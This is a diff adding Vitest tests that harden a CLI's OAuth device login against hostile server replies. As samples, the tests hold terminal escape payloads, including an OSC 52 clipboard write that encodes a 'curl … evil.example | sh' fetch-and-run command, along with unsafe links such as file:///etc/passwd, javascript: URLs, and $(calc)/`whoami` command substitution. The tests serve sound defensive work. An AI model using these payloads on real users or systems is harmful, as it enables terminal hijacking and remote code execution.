@@ -8,13 +8,23 @@
 
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
 import { EventEmitter } from 'node:events'
-import { formatUserCode, deviceName, authorizeDevice, pollDeviceToken, pollForTokens } from '../src/sdk/cli/device'
+import { formatUserCode, deviceName, authorizeDevice, pollDeviceToken, pollForTokens, parseDeviceAuthorization } from '../src/sdk/cli/device'
 import { renderLogin, outputMode, formatCountdown, SPINNER_FRAMES, SPINNER_INTERVAL_MS } from '../src/sdk/cli/login-output'
 import type { LoginScreen, OutputMode } from '../src/sdk/cli/login-output'
 import { runLogin, parseLoginArgs, EXIT } from '../src/sdk/cli/login'
 import type { LoginOptions } from '../src/sdk/cli/login'
-import { canOpenBrowser, copyToClipboard } from '../src/sdk/cli/desktop'
+import { canOpenBrowser, copyToClipboard, openInBrowser } from '../src/sdk/cli/desktop'
+import type { SpawnBrowser } from '../src/sdk/cli/desktop'
+import { cleanText, parseUserCode, openableUrl, MAX_TEXT_LENGTH } from '../src/sdk/cli/untrusted'
+import { getUser } from '../src/sdk/cli/auth'
 import type { StoredTokenData, TokenStorage } from '../src/sdk/cli/storage'
+
+// The confirm link is opened only on the API's own origin, and the API base is
+// read once, at import. Pin it to the default so a developer's ID_ORG_AI_URL
+// can't change what these tests see. fetch is mocked throughout: nothing is sent.
+vi.hoisted(() => {
+  delete process.env.ID_ORG_AI_URL
+})
 
 // ── Helpers ─────────────────────────────────────────────────────────────────
 
@@ -209,17 +219,20 @@ function memoryStorage(): TokenStorage & { saved: StoredTokenData | null } {
 interface Reply {
   status: number
   body: unknown
+  /** A body sent as is instead of `body`, e.g. one that isn't JSON. */
+  raw?: string
 }
 /**
  * A plain response object rather than undici's Response: its body streams could
- * schedule work on timers, which are fake here.
+ * schedule work on timers, which are fake here. With `raw`, json() parses it as
+ * undici would, so a bad body throws V8's SyntaxError, which quotes the body.
  */
-const json = (status: number, body: unknown) =>
+const json = (status: number, body: unknown, raw?: string) =>
   ({
     ok: status >= 200 && status < 300,
     status,
-    json: async () => body,
-    text: async () => JSON.stringify(body),
+    json: async () => (raw === undefined ? body : JSON.parse(raw)),
+    text: async () => raw ?? JSON.stringify(body),
   }) as unknown as Response
 const pending = (): Reply => ({ status: 400, body: { error: 'authorization_pending' } })
 const slowDown = (): Reply => ({ status: 400, body: { error: 'slow_down' } })
@@ -258,14 +271,14 @@ function fakeServer(tokenReplies: Array<Reply | 'network'>, options: { device?: 
     const path = new URL(url).pathname
     if (path === '/oauth/device') {
       const device = options.device
-      if (device && 'status' in device && 'body' in device) return json(device.status as number, device.body)
+      if (device && 'status' in device && 'body' in device) return json(device.status as number, device.body, (device as Reply).raw)
       return json(200, { ...DEVICE_REPLY, ...(device as object) })
     }
     if (path === '/oauth/token') {
       const reply = replies.shift()
       if (!reply) throw new Error('no token reply left')
       if (reply === 'network') throw new TypeError('fetch failed')
-      return json(reply.status, reply.body)
+      return json(reply.status, reply.body, reply.raw)
     }
     if (path === '/oauth/userinfo') return json(200, options.userinfo ?? USERINFO)
     throw new Error(`unexpected fetch: ${url}`)
@@ -834,5 +847,423 @@ describe('copyToClipboard', () => {
     await expect(copyToClipboard('https://x', { platform: 'darwin', env: { SSH_TTY: '/dev/ttys001' }, run, write })).resolves.toBe(true)
     expect(run).not.toHaveBeenCalled()
     expect(write).toHaveBeenCalledOnce()
+  })
+})
+
+// ── Server text and links are untrusted (Phase 6 review, B2) ────────────────
+//
+// A workspace name is whatever its owner typed; a hostile server or a man in
+// the middle can send anything in any field. Printed raw, an escape sequence
+// drives the terminal: OSC 52 writes every member's clipboard, OSC 8 hides a
+// link, CSI 2J clears the screen. These tests send such payloads in every field
+// login prints and check the bytes written.
+
+/** The renderer's own escapes: bold, dim, normal; cursor hide and show; erase line; up and down 2; CR; LF. */
+const OWN_ESCAPES = /\x1b\[(?:1|2|22)m|\x1b\[\?25[hl]|\x1b\[2[KAB]|\r|\n/g
+/** What must never reach the terminal from data: C0, DEL, C1, bidi controls, zero-width characters. */
+const FORBIDDEN = /[\u0000-\u001f\u007f-\u009f\u200b-\u200f\u202a-\u202e\u2066-\u2069\ufeff]/g
+
+/** Control characters in the bytes written, other than the renderer's own escapes, as U+XXXX. */
+function strayControls(raw: string): string[] {
+  return Array.from(raw.replace(OWN_ESCAPES, '').matchAll(FORBIDDEN), (m) => `U+${m[0].codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}`)
+}
+
+const OSC52_CONTENT = Buffer.from('curl -s https://evil.example/x | sh').toString('base64')
+const OSC52_PAYLOAD = `\x1b]52;c;${OSC52_CONTENT}\x07`
+
+const PAYLOADS: Array<[string, string]> = [
+  ['a bare ESC', '\x1b'],
+  ['OSC 52 (writes the clipboard)', OSC52_PAYLOAD],
+  ['OSC 8 (hides a link)', '\x1b]8;;https://evil.example\x1b\\here\x1b]8;;\x1b\\'],
+  ['CSI (clears the screen)', '\x1b[2J\x1b[3J\x1b[H'],
+  ['C1 controls', '\u009b2J\u009d52;c;ZXZpbA==\u009c\u0085'],
+  ['bidi controls', '\u202ereversed\u202c\u2066iso\u2069\u200f\u200e\u202a\u202b\u202d\u2067\u2068'],
+  ['zero-width characters', 'z\u200bw\u200cn\u200dj\ufeff'],
+  ['other C0 and DEL', '\x00\x07\x08\x0b\x0c\x7f\r\n\t'],
+]
+
+const hostile = (payload: string) => `Evil${payload}Corp`
+
+interface FieldCase {
+  field: string
+  /** The token endpoint's replies, given the hostile text. */
+  replies: (text: string) => Array<Reply | 'network'>
+  /** fakeServer's options, given the hostile text. */
+  server: (text: string) => Parameters<typeof fakeServer>[1]
+  exit: number
+}
+
+const FIELDS: FieldCase[] = [
+  {
+    field: 'verification_uri_complete',
+    replies: () => [pending(), approved()],
+    server: (text) => ({ device: { verification_uri_complete: `https://id.org.ai/device?code=WDJB-MJHT${text}` } }),
+    exit: EXIT.ok,
+  },
+  {
+    field: 'verification_uri (with no _complete)',
+    replies: () => [pending(), approved()],
+    server: (text) => ({ device: { verification_uri_complete: '', verification_uri: `https://id.org.ai/device${text}` } }),
+    exit: EXIT.ok,
+  },
+  {
+    field: 'error_description from /oauth/device',
+    replies: () => [],
+    server: (text) => ({ device: { status: 400, body: { error: 'invalid_client', error_description: text } } }),
+    exit: EXIT.failed,
+  },
+  {
+    field: 'error from /oauth/device',
+    replies: () => [],
+    server: (text) => ({ device: { status: 400, body: { error: text } } }),
+    exit: EXIT.failed,
+  },
+  {
+    field: 'error_description from /oauth/token',
+    replies: (text) => [{ status: 400, body: { error: 'invalid_grant', error_description: text } }],
+    server: () => ({}),
+    exit: EXIT.failed,
+  },
+  {
+    field: 'error from /oauth/token',
+    replies: (text) => [{ status: 400, body: { error: text } }],
+    server: () => ({}),
+    exit: EXIT.failed,
+  },
+  { field: 'userinfo name', replies: () => [pending(), approved()], server: (text) => ({ userinfo: { ...USERINFO, name: text } }), exit: EXIT.ok },
+  { field: 'userinfo email', replies: () => [pending(), approved()], server: (text) => ({ userinfo: { ...USERINFO, email: text } }), exit: EXIT.ok },
+  { field: 'userinfo org_name', replies: () => [pending(), approved()], server: (text) => ({ userinfo: { ...USERINFO, org_name: text } }), exit: EXIT.ok },
+]
+
+describe.each(FIELDS)('$field is printed without control bytes', ({ replies, server, exit }) => {
+  it.each(PAYLOADS)('%s', async (_, payload) => {
+    const text = hostile(payload)
+    fakeServer(replies(text), server(text))
+    const { options, term, openUrl, copyText } = loginOptions()
+    const done = runLogin(options)
+    await vi.advanceTimersByTimeAsync(8_000)
+    await expect(done).resolves.toBe(exit)
+
+    expect(strayControls(term.raw)).toEqual([])
+    // The field did reach the screen, cleaned: not a vacuous pass.
+    expect(term.raw).toMatch(/Evil[^\n]*Corp/)
+    // A link that came with control characters is neither opened nor copied.
+    for (const call of [...openUrl.mock.calls, ...copyText.mock.calls]) expect(call[0]).toBe(URL_4A)
+  })
+})
+
+describe('server text is cleaned on the way in', () => {
+  it('cleanText strips C0, DEL, C1, bidi and zero-width characters, and nothing else', () => {
+    for (const [, payload] of PAYLOADS) expect(strayControls(cleanText(hostile(payload)))).toEqual([])
+    expect(cleanText(`Evil${OSC52_PAYLOAD}Corp`)).toBe(`Evil]52;c;${OSC52_CONTENT}Corp`)
+    expect(cleanText('Zoë Ångström · 日本語 · 👩🏽\u200d💻')).toBe('Zoë Ångström · 日本語 · 👩🏽💻')
+    expect(cleanText('Bryant Skarda')).toBe('Bryant Skarda')
+  })
+
+  it('cleanText caps the length at 200, marking the cut', () => {
+    expect(MAX_TEXT_LENGTH).toBe(200)
+    expect(cleanText('A'.repeat(200))).toBe('A'.repeat(200))
+    expect(cleanText('A'.repeat(5_000))).toBe('A'.repeat(199) + '…')
+    expect(Array.from(cleanText('日'.repeat(500))).length).toBe(200)
+  })
+
+  it('cleanText makes anything that is not a string empty', () => {
+    expect(cleanText(undefined)).toBe('')
+    expect(cleanText(null)).toBe('')
+    expect(cleanText(42)).toBe('')
+    expect(cleanText({ toString: () => '\x1b[2J' })).toBe('')
+  })
+
+  it('a long name is cut to 200 characters on the screen', async () => {
+    fakeServer([approved()], { userinfo: { ...USERINFO, name: 'A'.repeat(5_000) } })
+    const { options, term } = loginOptions()
+    const done = runLogin(options)
+    await vi.advanceTimersByTimeAsync(4_000)
+    await expect(done).resolves.toBe(EXIT.ok)
+    expect(term.line(9)).toBe(`  ✓ Signed in as ${'A'.repeat(199)}… {d}<bryant@driv.ly>{/}`)
+  })
+
+  it('getUser hands back cleaned values, and nothing for a field that is not a string', async () => {
+    vi.stubGlobal(
+      'fetch',
+      vi.fn(async () =>
+        json(200, { sub: `user_1${OSC52_PAYLOAD}`, name: { first: 'Bryant' }, email: 'bryant@driv.ly\u202e', org_id: 'org_1\x1b[2J', org_name: `Dri\u200bvly${OSC52_PAYLOAD}` }),
+      ),
+    )
+    const { user } = await getUser('at_test')
+    expect(user).toEqual({
+      id: `user_1]52;c;${OSC52_CONTENT}`,
+      name: undefined,
+      email: 'bryant@driv.ly',
+      organizationId: 'org_1[2J',
+      organizationName: `Drivly]52;c;${OSC52_CONTENT}`,
+    })
+  })
+
+  it('a token reply that is not JSON fails cleanly, without quoting it', async () => {
+    fakeServer([{ status: 200, body: null, raw: `${OSC52_PAYLOAD}not json` }])
+    const { options, term, storage } = loginOptions()
+    const done = runLogin(options)
+    await vi.advanceTimersByTimeAsync(4_000)
+    await expect(done).resolves.toBe(EXIT.failed)
+    expect(term.line(9)).toBe("  ✗ Sign-in failed: the server sent a reply the CLI can't read")
+    expect(strayControls(term.raw)).toEqual([])
+    expect(storage.saved).toBeNull()
+  })
+
+  it("authorizeDevice's error carries no control bytes either, for other callers that print it", async () => {
+    fakeServer([], { device: { status: 400, body: null, raw: `${OSC52_PAYLOAD}<html>bad gateway</html>` } })
+    const error = await authorizeDevice('auto_dev_cli').catch((e: unknown) => e as Error)
+    expect(error).toBeInstanceOf(Error)
+    expect(error.message).toContain('bad gateway')
+    expect(strayControls(error.message)).toEqual([])
+  })
+
+  it('a device reply that is not JSON fails cleanly, without quoting it', async () => {
+    fakeServer([], { device: { status: 200, body: null, raw: `${OSC52_PAYLOAD}not json` } })
+    const { options, term } = loginOptions()
+    await expect(runLogin(options)).resolves.toBe(EXIT.failed)
+    expect(term.line(3)).toBe("  ✗ Sign-in failed: the server sent a reply the CLI can't read")
+    expect(strayControls(term.raw)).toEqual([])
+  })
+})
+
+// ── The user code is checked strictly ───────────────────────────────────────
+
+describe('the user code', () => {
+  it('parseUserCode takes 8 characters of the code alphabet, with or without the hyphen', () => {
+    expect(parseUserCode('WDJBMJHT')).toBe('WDJB-MJHT')
+    expect(parseUserCode('WDJB-MJHT')).toBe('WDJB-MJHT')
+    expect(parseUserCode('ABCDEFGH')).toBe('ABCD-EFGH')
+    expect(parseUserCode('JKLMNPQR')).toBe('JKLM-NPQR')
+    expect(parseUserCode('STUVWXYZ')).toBe('STUV-WXYZ')
+    expect(parseUserCode('2345-6789')).toBe('2345-6789')
+  })
+
+  const BAD_CODES: Array<[string, unknown]> = [
+    ['an escape sequence', 'WDJB\x1b[2JMJHT'],
+    ['OSC 52', OSC52_PAYLOAD],
+    ['a bidi control', 'WDJB\u202eMJHT'],
+    ['too short', 'WDJBMJH'],
+    ['too long', 'WDJBMJHTX'],
+    ['lower case', 'wdjb-mjht'],
+    ['a 0, outside the alphabet', 'WDJB-MJ0T'],
+    ['an I, outside the alphabet', 'WDJB-MJIT'],
+    ['a misplaced hyphen', 'WDJ-BMJHT'],
+    ['two hyphens', 'WDJB--MJHT'],
+    ['a space', 'WDJB MJHT'],
+    ['a trailing newline', 'WDJB-MJHT\n'],
+    ['a number', 23456789],
+    ['nothing', undefined],
+  ]
+
+  it.each(BAD_CODES)('parseUserCode refuses %s', (_, code) => {
+    expect(parseUserCode(code)).toBeNull()
+  })
+
+  it.each(BAD_CODES)('%s: a protocol error, exit 1, the code never echoed', async (_, code) => {
+    const server = fakeServer([approved()], { device: { user_code: code as string } })
+    const { options, term, openUrl, copyText } = loginOptions()
+    await expect(runLogin(options)).resolves.toBe(EXIT.failed)
+    expect(term.lines()).toEqual(['', '{b}  auto.dev{/}{d}  ·  sign in with id.org.ai{/}', '', '  ✗ Sign-in failed: the server sent an invalid user code', '', ''])
+    expect(strayControls(term.raw)).toEqual([])
+    expect(openUrl).not.toHaveBeenCalled()
+    expect(copyText).not.toHaveBeenCalled()
+    expect(server.tokenCalls()).toBe(0)
+  })
+
+  it('a hyphenated code is shown as sent', async () => {
+    fakeServer([pending()], { device: { user_code: 'WDJB-MJHT' } })
+    const { options, term } = loginOptions()
+    void runLogin(options)
+    await vi.advanceTimersByTimeAsync(0)
+    expect(term.line(3)).toBe('{d}  Code     {/}{b}WDJB-MJHT{/}')
+  })
+
+  it('parseDeviceAuthorization refuses a reply with no device code or no link', () => {
+    const invalid = { ok: false, error: 'the server sent an invalid reply' }
+    expect(parseDeviceAuthorization({ ...DEVICE_REPLY, device_code: undefined })).toEqual(invalid)
+    expect(parseDeviceAuthorization({ ...DEVICE_REPLY, device_code: 42 })).toEqual(invalid)
+    expect(parseDeviceAuthorization({ ...DEVICE_REPLY, verification_uri: undefined, verification_uri_complete: undefined })).toEqual(invalid)
+    expect(parseDeviceAuthorization(null)).toEqual({ ok: false, error: 'the server sent an invalid user code' })
+  })
+
+  it('parseDeviceAuthorization hands back clean values', () => {
+    expect(parseDeviceAuthorization(DEVICE_REPLY, 'https://id.org.ai')).toEqual({
+      ok: true,
+      grant: { deviceCode: 'dc_test', userCode: 'WDJB-MJHT', url: URL_4A, link: URL_4A, expiresIn: 1800, interval: 4 },
+    })
+    expect(parseDeviceAuthorization({ ...DEVICE_REPLY, verification_uri_complete: 'file:///etc/passwd', expires_in: 'soon' }, 'https://id.org.ai')).toEqual({
+      ok: true,
+      grant: { deviceCode: 'dc_test', userCode: 'WDJB-MJHT', url: 'file:///etc/passwd', link: undefined, expiresIn: 600, interval: 4 },
+    })
+  })
+})
+
+// ── The confirm link is opened and copied only when it is safe ──────────────
+
+describe('the confirm link', () => {
+  const UNSAFE_LINKS: Array<[string, string]> = [
+    ['file:', 'file:///etc/passwd'],
+    ['javascript:', 'javascript:alert(document.cookie)'],
+    ['data:', 'data:text/html,<script>alert(1)</script>'],
+    ['a foreign host', 'https://evil.example/device?code=WDJB-MJHT'],
+    ['a look-alike host', 'https://id.org.ai.evil.example/device?code=WDJB-MJHT'],
+    ['credentials in front of a foreign host', 'https://id.org.ai@evil.example/device?code=WDJB-MJHT'],
+    ['credentials on the right host', 'https://user:pass@id.org.ai/device?code=WDJB-MJHT'],
+    ['http: on a non-loopback host', 'http://id.org.ai/device?code=WDJB-MJHT'],
+    ['another port', 'https://id.org.ai:8443/device?code=WDJB-MJHT'],
+    ['a protocol-relative link', '//evil.example/device'],
+    ['a leading - (an option to the opener)', '-a Calculator'],
+    ['a leading -- before a good link', '--new-window=https://id.org.ai/device?code=WDJB-MJHT'],
+    ['a control character', 'https://id.org.ai/device?code=WDJB-MJHT\x1b]8;;https://evil.example\x07'],
+    ['a space', 'https://id.org.ai/device?code=WDJB-MJHT https://evil.example'],
+    ['a character no URL needs', 'https://id.org.ai/device?code=$(calc)`whoami`'],
+    ['more than 200 characters', `https://id.org.ai/device?code=WDJB-MJHT&pad=${'a'.repeat(200)}`],
+  ]
+
+  it.each(UNSAFE_LINKS)('%s: not opened, not copied, shown with a warning', async (_, link) => {
+    fakeServer([pending(), pending(), pending()], { device: { verification_uri_complete: link } })
+    const { options, term, keys, openUrl, copyText } = loginOptions()
+    void runLogin(options)
+    await vi.advanceTimersByTimeAsync(0)
+    keys.press('o')
+    keys.press('c')
+    keys.press('O')
+    keys.press('C')
+    await vi.advanceTimersByTimeAsync(1)
+
+    expect(openUrl).not.toHaveBeenCalled()
+    expect(copyText).not.toHaveBeenCalled()
+    expect(term.line(4)).toBe(`{d}  Confirm  {/}${cleanText(link)}`)
+    expect(term.line(5)).toBe("           Not opened: this link isn't on https://id.org.ai.")
+    expect(strayControls(term.raw)).toEqual([])
+  })
+
+  it('the warning is printed when not a terminal too', async () => {
+    fakeServer([pending(), approved()], { device: { verification_uri_complete: 'file:///etc/passwd' } })
+    const term = new FakeTerminal(false)
+    const { options, openUrl } = loginOptions({ term, keys: new FakeKeys(false) })
+    const done = runLogin(options)
+    await vi.advanceTimersByTimeAsync(8_000)
+    await expect(done).resolves.toBe(EXIT.ok)
+    expect(term.raw.split('\n').slice(3, 6)).toEqual(['  Code     WDJB-MJHT', '  Confirm  file:///etc/passwd', "           Not opened: this link isn't on https://id.org.ai."])
+    expect(openUrl).not.toHaveBeenCalled()
+  })
+
+  it('a good https link on the API origin still opens and copies, normalised', async () => {
+    fakeServer([pending(), pending()], { device: { verification_uri_complete: 'HTTPS://ID.ORG.AI:443/device?code=WDJB-MJHT' } })
+    const { options, term, keys, openUrl, copyText } = loginOptions()
+    void runLogin(options)
+    await vi.advanceTimersByTimeAsync(0)
+    expect(openUrl).toHaveBeenCalledWith(URL_4A)
+    expect(term.line(4)).toBe(`{d}  Confirm  {/}${URL_4A}`)
+    keys.press('c')
+    await vi.advanceTimersByTimeAsync(1)
+    expect(copyText).toHaveBeenCalledWith(URL_4A)
+  })
+
+  it('openableUrl: https on the API origin, or http on a loopback API', () => {
+    expect(openableUrl(URL_4A, 'https://id.org.ai')).toBe(URL_4A)
+    expect(openableUrl('https://id.org.ai/device', 'https://id.org.ai/')).toBe('https://id.org.ai/device')
+    expect(openableUrl('http://localhost:8787/device?code=WDJB-MJHT', 'http://localhost:8787')).toBe('http://localhost:8787/device?code=WDJB-MJHT')
+    expect(openableUrl('http://127.0.0.1:8787/device', 'http://127.0.0.1:8787')).toBe('http://127.0.0.1:8787/device')
+    expect(openableUrl('http://[::1]:8787/device', 'http://[::1]:8787')).toBe('http://[::1]:8787/device')
+  })
+
+  it('openableUrl: never http on a non-loopback host, another origin, or with a bad API base', () => {
+    expect(openableUrl('http://example.test/device', 'http://example.test')).toBeNull()
+    expect(openableUrl('http://localhost:9999/device', 'http://localhost:8787')).toBeNull()
+    expect(openableUrl('http://localhost:8787/device', 'https://id.org.ai')).toBeNull()
+    expect(openableUrl('https://id.org.ai/device', 'not a url')).toBeNull()
+    expect(openableUrl(undefined, 'https://id.org.ai')).toBeNull()
+    for (const [, link] of UNSAFE_LINKS) expect(openableUrl(link, 'https://id.org.ai')).toBeNull()
+  })
+})
+
+// ── The browser is opened without a shell ───────────────────────────────────
+
+describe('openInBrowser', () => {
+  /** A child_process.spawn stand-in: records each call; the commands in `missing` fail to start (ENOENT). */
+  function fakeSpawn(missing: string[] = []) {
+    const calls: Array<{ command: string; args: string[]; options: Record<string, unknown> }> = []
+    const spawn: SpawnBrowser = (command, args, options) => {
+      calls.push({ command, args: [...args], options: { ...options } })
+      const child = Object.assign(new EventEmitter(), { unref: vi.fn() })
+      // Native promises are never faked, so this runs once the listeners are on.
+      void Promise.resolve().then(() => {
+        if (missing.includes(command)) child.emit('error', Object.assign(new Error(`spawn ${command} ENOENT`), { code: 'ENOENT' }))
+        else child.emit('spawn')
+      })
+      return child
+    }
+    return { spawn, calls }
+  }
+
+  /** Every launch: no shell, and the link as one whole argument, last. */
+  function expectNoShell(calls: ReturnType<typeof fakeSpawn>['calls'], url: string) {
+    expect(calls.length).toBeGreaterThan(0)
+    for (const { command, args, options } of calls) {
+      expect(options.shell).toBeFalsy()
+      expect(command).not.toMatch(/powershell|pwsh|^cmd(\.exe)?$|^sh$|bash/i)
+      expect(args.at(-1)).toBe(url)
+    }
+  }
+
+  const LINK = 'https://id.org.ai/device?code=WDJB-MJHT&x=$(calc)'
+
+  it('macOS: open, no shell', async () => {
+    const { spawn, calls } = fakeSpawn()
+    await expect(openInBrowser(LINK, { platform: 'darwin', env: {}, spawn })).resolves.toBe(true)
+    expect(calls.map((c) => [c.command, c.args])).toEqual([['open', [LINK]]])
+    expectNoShell(calls, LINK)
+  })
+
+  it('Windows: rundll32, not PowerShell or cmd', async () => {
+    const { spawn, calls } = fakeSpawn()
+    await expect(openInBrowser(LINK, { platform: 'win32', env: {}, spawn })).resolves.toBe(true)
+    expect(calls.map((c) => [c.command, c.args])).toEqual([['rundll32', ['url.dll,FileProtocolHandler', LINK]]])
+    expectNoShell(calls, LINK)
+  })
+
+  it('Linux: xdg-open, no shell', async () => {
+    const { spawn, calls } = fakeSpawn()
+    await expect(openInBrowser(LINK, { platform: 'linux', env: { DISPLAY: ':0' }, spawn })).resolves.toBe(true)
+    expect(calls.map((c) => [c.command, c.args])).toEqual([['xdg-open', [LINK]]])
+    expectNoShell(calls, LINK)
+  })
+
+  it('WSL: wslview, then the Windows opener, then xdg-open; never PowerShell', async () => {
+    const { spawn, calls } = fakeSpawn(['wslview', 'rundll32.exe'])
+    await expect(openInBrowser(LINK, { platform: 'linux', env: { WSL_DISTRO_NAME: 'Ubuntu' }, spawn })).resolves.toBe(true)
+    expect(calls.map((c) => c.command)).toEqual(['wslview', 'rundll32.exe', 'xdg-open'])
+    expectNoShell(calls, LINK)
+  })
+
+  it('resolves false when no opener starts', async () => {
+    const { spawn } = fakeSpawn(['xdg-open'])
+    await expect(openInBrowser(LINK, { platform: 'linux', env: { DISPLAY: ':0' }, spawn })).resolves.toBe(false)
+  })
+
+  it.each([
+    ['file:', 'file:///etc/passwd'],
+    ['javascript:', 'javascript:alert(1)'],
+    ['a leading -', '-a Calculator'],
+    ['a leading --', '--args https://id.org.ai/device'],
+    ['an option after a space', ' -a Calculator'],
+    ['a space', 'https://id.org.ai/device https://evil.example'],
+    ['a control character', 'https://id.org.ai/device\x1b[2J'],
+  ])('never launches %s', async (_, url) => {
+    for (const platform of ['darwin', 'win32', 'linux']) {
+      const { spawn, calls } = fakeSpawn()
+      await expect(openInBrowser(url, { platform, env: { DISPLAY: ':0' }, spawn })).resolves.toBe(false)
+      expect(calls).toEqual([])
+    }
+  })
+
+  it('never launches over SSH', async () => {
+    const { spawn, calls } = fakeSpawn()
+    await expect(openInBrowser(LINK, { platform: 'darwin', env: { SSH_CONNECTION: '1.2.3.4 22 5.6.7.8 22' }, spawn })).resolves.toBe(false)
+    expect(calls).toEqual([])
   })
 })
